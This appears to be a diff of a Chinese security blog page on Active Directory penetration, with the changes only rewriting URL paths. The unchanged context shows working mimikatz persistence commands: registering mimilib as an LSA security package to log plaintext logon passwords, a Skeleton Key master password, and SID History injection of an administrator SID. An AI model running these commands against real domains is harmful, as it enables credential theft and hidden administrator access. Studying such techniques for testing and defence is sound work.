 <p>2）修改HKEY_LOCAL_MACHINE&#x2F;System&#x2F;CurrentControlSet&#x2F;Control&#x2F;Lsa&#x2F;Security Packages 项，加载新的DLL文件！</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">reg</span> query hklm\system\currentcontrolset\control\lsa\ /v <span class="hljs-string">&quot;Security Packages&quot;</span><br><br><span class="hljs-attribute">reg</span> add <span class="hljs-string">&quot;hklm\system\currentcontrolset\control\lsa\&quot; /v &quot;</span>Security Packages<span class="hljs-string">&quot; /d &quot;</span>kerberos\<span class="hljs-number">0</span>msv1_0\<span class="hljs-number">0</span>schannel\<span class="hljs-number">0</span>wdigest\<span class="hljs-number">0</span>tspkg\<span class="hljs-number">0</span>pku2u\<span class="hljs-number">0</span>mimilib<span class="hljs-string">&quot; /t REG_MULTI_SZ</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912101842195.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230912101842195"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912101842195.png" srcset="/img/loading.gif" lazyload alt="image-20230912101842195"> </p>
 <p>系统重启后，如果DLL被成功加载，用户在登录时输入的账户密码明文就会被记录在C:\windows\system32\kiwissp.log中。</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912102233344.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230912102233344"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912102233344.png" srcset="/img/loading.gif" lazyload alt="image-20230912102233344"> </p>
 <h2 id="skeleton-Key"><a href="#skeleton-Key" class="headerlink" title="skeleton Key"></a>skeleton Key</h2><p>1）权限不足</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dir</span> \\<span class="hljs-number">192.168.3.142</span>\c$    <span class="hljs-comment">#权限不足</span><br></code></pre></td></tr></table></figure>
 
@@ -781,16 +781,16 @@
 <p>注入成功后，会在域内所有的账号中添加一个<strong>Skeleton Key</strong>，默认密码为mimikatz。接下来可以在域内任意用户的身份，配合该Skeleton Key，进行域内身份验证授权了。在不使用域管理员原始密码的情况下，使用注入的万能密码。</p>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.3.142\ipc$ /del /y<br> <br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\OWA2010SP3.0day.org\ipc$ <span class="hljs-string">&quot;mimikatz&quot;</span> /user:0day.org\administrator<br><span class="hljs-comment">//这里只能够用主机名，用其他的就会失效，不知道为什么</span><br><span class="hljs-keyword">dir</span> \\192.168.3.142.com\c$<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> z: \\OWA2010SP3.0day.org\c$<br><span class="hljs-comment">//映射</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912185910754.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230912185910754"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912185910754.png" srcset="/img/loading.gif" lazyload alt="image-20230912185910754"> </p>
 <h2 id="SID-History域后门"><a href="#SID-History域后门" class="headerlink" title="SID History域后门"></a>SID History域后门</h2><p>使用域管理员权限查看test用户的SID History属性</p>
 <figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">Administrator</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-variable">ActiveDirectory</span><br><span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">Administrator</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">ADUser</span> <span class="hljs-variable">test</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Properties</span> <span class="hljs-variable">sidhistory</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912193405155.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230912193405155"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912193405155.png" srcset="/img/loading.gif" lazyload alt="image-20230912193405155"> </p>
 <p>使用域管理员权限运行mimikatz，将administrator的SID添加到普通用户test的SID History属性中。 </p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>提升权限<br>privilege::debug<br><span class="hljs-regexp">//</span>修复NTDS服务<br>sid::patch<br><span class="hljs-regexp">//</span>将高权限SID注入到地权限用户的SID History属性<br>sid::add <span class="hljs-regexp">/sam:test /</span>new:administrator<br></code></pre></td></tr></table></figure>
 
 <p>此时重新查看用户的sid，发现出现了500</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912193546939.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230912193546939"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912193546939.png" srcset="/img/loading.gif" lazyload alt="image-20230912193546939"> </p>
 
               
             </div>
@@ -808,7 +808,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>域渗透基础知识</div>
-      <div>https://decemberus.github.io/Decemberus.github-io/2023/08/02/域渗透基础知识/</div>
+      <div>https://blog.decemberus.com/2023/08/02/域渗透基础知识/</div>
     </div>
     <div class="license-meta">
       
@@ -850,7 +850,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/Decemberus.github-io/2023/09/29/SQLMap%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%B7%B1%E5%85%A5/" title="SQLMap原理及其深入">
+                      <a href="/2023/09/29/SQLMap%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%B7%B1%E5%85%A5/" title="SQLMap原理及其深入">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">SQLMap原理及其深入</span>
                         <span class="visible-mobile">上一篇</span>
@@ -860,7 +860,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/Decemberus.github-io/2023/07/09/impacket%E4%B8%ADexec%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E7%94%A8%E6%B3%95/" title="impacket中各种exec的区别与用法">
+                      <a href="/2023/07/09/impacket%E4%B8%ADexec%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E7%94%A8%E6%B3%95/" title="impacket中各种exec的区别与用法">
                         <span class="hidden-mobile">impacket中各种exec的区别与用法</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -986,8 +986,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/Decemberus.github-io/js/events.js" ></script>
-<script  src="/Decemberus.github-io/js/plugins.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -1011,7 +1011,7 @@
 
 
   
-    <script  src="/Decemberus.github-io/js/img-lazyload.js" ></script>
+    <script  src="/js/img-lazyload.js" ></script>
   
 
 
@@ -1148,7 +1148,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/Decemberus.github-io/js/local-search.js" ></script>
+  <script  src="/js/local-search.js" ></script>
 
 
 
@@ -1156,7 +1156,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/Decemberus.github-io/js/boot.js" ></script>
+<script  src="/js/boot.js" ></script>
 
 
   
